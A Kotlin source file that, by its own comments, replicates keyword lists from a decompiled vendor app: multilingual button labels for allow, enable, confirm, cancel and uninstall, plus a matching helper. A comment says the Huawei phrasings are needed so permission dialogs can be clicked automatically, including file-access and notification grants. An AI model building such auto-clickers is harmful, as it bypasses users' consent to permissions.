package com.storm.safe.rock.service.modules.yw5xud

/**
 * 多语种关键词词库。逐字对齐 vendor `jadx-reference/p000/dh0.java`。
 *
 * - [ALLOW]       = vendor dh0.f55750a0 (L12, 76 条"允许"多语种变体)
 * - [ENABLE]      = vendor dh0.f55751a1 (L15, 37 条"启用"变体)
 * - [CONFIRM_OK]  = vendor dh0.f55752a2 (L18, 114 条"确认/OK/是"变体)
 * - [CANCEL_NO]   = vendor dh0.f55753a3 (L21, 106 条"取消/否/拒绝"变体)
 * - [UNINSTALL]   = vendor dh0.f55754a4 (L24, 104 条"卸载/禁用/删除"变体)
 *
 * 顺序、字符、零宽字符 (\u200c) 与 vendor 严格一致；禁止增删或重排。
 */
object AllowKeywords {

    /** vendor dh0.f55750a0 — L12 */
    val ALLOW: List<String> = listOf(
        "允许", "允許", "許可", "許可する", "許可", "허용", "Cho phép", "อนุญาต",
        "Izinkan", "Memungkinkan", "Benarkan", "Membenarkan", "Payagan",
        "ခွင့်ပြု", "ခွင့်ပြုရန်", "អនុញ្ញាត", "ອະນຸຍາດ",
        "अनुमति दें", "अनुमति", "অনুমতি দিন", "অনুমতি",
        "اجازت دیں", "اجازت", "अनुमति दिनुहोस्", "අවසර දෙන්න",
        "ፍቀድ", "ஆக்கு", "అనుమతి", "ಅನುಮತಿ", "അനുവദിക്കുക",
        "परवानगी", "પરવાનગી", "ਇਜਾਜ਼ਤ ਦਿਓ",
        "السماح", "تسمح", "לאפשר", "כן, זה בסדר",
        "اجازه", "ارزیابی\u200cشده",
        "İzin ver", "İzin Ver",
        "Allow", "Autoriser",
        "Permitir", "Permitir",
        "Consenti", "Consentire",
        "Zulassen", "Toestaan",
        "Tillåt", "Tillåta",
        "Tillat", "Tillate",
        "Tillad", "Salli",
        "Разрешить", "Дозволити", "Дозвол.",
        "Zezwól", "Pozwól",
        "Povolit", "Povoliť",
        "Engedélyezés", "Engedélyez",
        "Permite",
        "Να επιτρέπεται", "Επιτρέπω",
        "Разрешаване", "Позволете",
        "Ruhusu", "Dopusti", "Dovoli", "Leisti", "Atļaut", "Luba", "Дозволи",
        // ADAPT: 华为专属弹窗确认词 — vendor dh0.f55055c1 补齐；vendor ALLOW 列表不含这些词，
        //        但华为 EMUI/HarmonyOS 权限弹窗使用这些变体，需要匹配才能自动点击。
        // 简体
        "仅使用期间允许", "本次使用允许", "允许本次使用", "本次使用时允许",
        "每次都询问", "忽略", "不再提示", "不再询问", "知道了", "我知道了",
        "允许管理所有文件", "允许访问所有文件",
        "允许使用照片和视频", "允许访问照片和视频",
        "允许通知", "发送通知", "全部允许", "允许全部",
        "开启", "打开", "同意",
        // 繁体
        "僅使用期間允許", "本次使用允許", "允許本次使用",
        "允許管理所有檔案", "允許存取所有檔案",
        "全部允許", "開啟", "打開",
        // 英文
        "Allow always", "While using the app", "Agree", "Permit"
    )

    /** vendor dh0.f55751a1 — L15 */
    val ENABLE: List<String> = listOf(
        "启用", "開啟", "有効にする", "사용", "사용하다",
        "Bật", "เปิดใช้งาน",
        "Aktifkan", "Fungsikan",
        "सक्षम करें", "يُمكّن", "הפוך לזמין",
        "Lütfen etkinleştir",
        "Enable", "Activer",
        "Habilitar", "Ativar",
        "Abilitare",
        "Aktivieren", "Activeren",
        "Aktivera", "Aktivere",
        "Ottaa käyttöön",
        "Включить",
        "Włączyć",
        "Zapnout", "Aktivovať",
        "Engedélyez",
        "Activa",
        "Активиране",
        "Ενεργοποιώ",
        "Aktivirati", "Vključiti", "Aktyvinti", "Aktivizēt", "Aktiveer", "Washa"
    )

    /** vendor dh0.f55752a2 — L18 */
    val CONFIRM_OK: List<String> = listOf(
        "确定", "确认", "好", "好的", "知道了", "我知道了",
        "確定", "確認",
        "OK", "はい", "了解",
        "확인", "예",
        "Đồng ý", "ตกลง", "ใช่",
        "Oke", "OKE", "Ya", "Baik", "Ya", "Oo",
        "ဟုတ်ကဲ့", "យល់ព្រម", "ຕົກລົງ",
        "ठीक है", "हां",
        "ঠিক আছে", "হ্যাঁ",
        "ٹھیک ہے", "ठिक छ", "හරි", "እሺ",
        "حسنًا", "حسنا", "نعم", "موافق",
        "אישור", "כן",
        "تأیید", "باشه", "بله",
        "Tamam", "Evet",
        "OK", "Yes", "Confirm", "Done", "Got it",
        "Oui", "Confirmer", "Terminé",
        "Aceptar", "Sí", "Confirmar", "Hecho",
        "Sim", "Confirmar", "Concluído",
        "Ok", "Sì", "Conferma", "Fatto",
        "Ja", "Bestätigen", "Fertig",
        "Ja", "Bevestigen", "Klaar",
        "Ja", "Bekräfta", "Klar",
        "Ja", "Bekreft", "Ferdig",
        "Ja", "Bekræft", "Færdig",
        "Kyllä", "Vahvista",
        "ОК", "Да", "Подтвердить", "Готово",
        "Так", "Підтвердити", "Готово",
        "Tak", "Potwierdź", "Gotowe",
        "Ano", "Potvrdit", "Hotovo",
        "Áno", "Potvrdiť", "Hotovo",
        "Igen", "Megerősít", "Kész",
        "Da", "Confirmă", "Gata",
        "Ναι", "Επιβεβαίωση",
        "Да", "Потвърди", "Готово",
        "Sawa", "Ndio", "Thibitisha",
        "Da", "Potvrdi",
        "Da", "Potrdi"
    )

    /** vendor dh0.f55753a3 — L21 */
    val CANCEL_NO: List<String> = listOf(
        "取消", "否", "不", "拒绝",
        "取消", "否",
        "キャンセル", "いいえ",
        "취소", "아니오", "아니요",
        "Hủy", "Không",
        "ยกเลิก", "ไม่",
        "Batal", "Tidak",
        "Batal", "Kanselahin", "Hindi",
        "မလုပ်တော့", "បោះបង់", "ຍົກເລີກ",
        "रद्द करें", "नहीं",
        "বাতিল করুন", "বাতিল", "না",
        "منسوخ کریں", "منسوخ",
        "रद्द गर्नुहोस्", "අවලංගු කරන්න", "ይቅር",
        "إلغاء", "لا",
        "ביטול", "לא",
        "لغو", "خیر",
        "İptal", "Hayır",
        "Cancel", "No", "Deny", "Reject",
        "Annuler", "Non", "Refuser",
        "Cancelar", "No", "Denegar",
        "Cancelar", "Não", "Negar",
        "Annulla", "No", "Nega",
        "Abbrechen", "Nein", "Ablehnen",
        "Annuleren", "Nee", "Weigeren",
        "Avbryt", "Nej", "Neka",
        "Avbryt", "Nei", "Avslå",
        "Annuller", "Nej", "Afvis",
        "Peru", "Peruuta", "Ei", "Kieltää",
        "Отмена", "Нет", "Отклонить",
        "Скасувати", "Ні", "Відхилити",
        "Anuluj", "Nie", "Odmów",
        "Zrušit", "Ne", "Odmítnout",
        "Zrušiť", "Nie", "Odmietnuť",
        "Mégse", "Nem", "Elutasít",
        "Anulează", "Nu", "Refuză",
        "Ακύρωση", "Όχι",
        "Отказ", "Отмени",
        "Не", "Откажи",
        "Ghairi", "Hapana", "Kataa"
    )

    /** vendor dh0.f55754a4 — L24 */
    val UNINSTALL: List<String> = listOf(
        "卸载", "移除", "删除", "停用", "禁用",
        "卸載", "移除", "刪除", "停用", "禁用",
        "アンインストール", "削除", "無効化",
        "제거", "삭제", "사용 중지",
        "Gỡ cài đặt", "Xóa",
        "ถอนการติดตั้ง", "ลบ",
        "Copot pemasangan", "Hapus",
        "Nyahpasang", "Padam",
        "अनइंस्टॉल", "हटाएं",
        "আনইনস্টল", "মুছে ফেলুন",
        "إلغاء التثبيت", "حذف", "إزالة",
        "הסר התקנה", "מחק",
        "Kaldır", "Sil",
        "Uninstall", "Remove", "Delete", "Disable",
        "Désinstaller", "Supprimer", "Désactiver",
        "Desinstalar", "Eliminar", "Deshabilitar",
        "Desinstalar", "Remover", "Desativar",
        "Disinstalla", "Rimuovi", "Disabilita",
        "Deinstallieren", "Entfernen", "Deaktivieren",
        "Verwijderen", "Uitschakelen",
        "Avinstallera", "Ta bort", "Inaktivera",
        "Avinstaller", "Fjern", "Deaktiver",
        "Fjern", "Slet", "Deaktiver",
        "Poista", "Poista käytöstä",
        "Удалить", "Деинсталляция", "Отключить",
        "Odinstaluj", "Usuń", "Wyłącz",
        "Odinstalovat", "Odstranit", "Zakázat",
        "Odinštalovať", "Odstrániť", "Zakázať",
        "Eltávolítás", "Törlés", "Letiltás",
        "Dezinstalare", "Șterge", "Dezactivare",
        "Деинсталиране", "Изтрий", "Деактивиране",
        "Видалити", "Вимкнути",
        "Κατάργηση", "Διαγραφή",
        "Deinstaliraj", "Ukloni",
        "Odstranitev", "Onemogoči",
        "Pašalinti", "Išjungti",
        "Atinstalēt", "Dzēst",
        "Desinstallimine", "Kustuta",
        "Ondoa", "Futa"
    )

    /**
     * 判断 `text` 是否包含 [keywords] 中任一关键词。对拉丁字符做 lowercase 容错，
     * 中文/CJK 字符无大小写概念，按原样 contains。
     *
     * // ADAPT: vendor dh0.java 仅暴露静态 List，未封装 matchesAny 工具方法；
     * //        此处是 replica 为调用方便添加的便利函数。调用方可直接用 list.any { text.contains(it) }。
     */
    fun matchesAny(text: String?, keywords: List<String>): Boolean {
        if (text.isNullOrEmpty()) return false
        val lower = text.lowercase()
        return keywords.any { kw -> text.contains(kw) || lower.contains(kw.lowercase()) }
    }
}
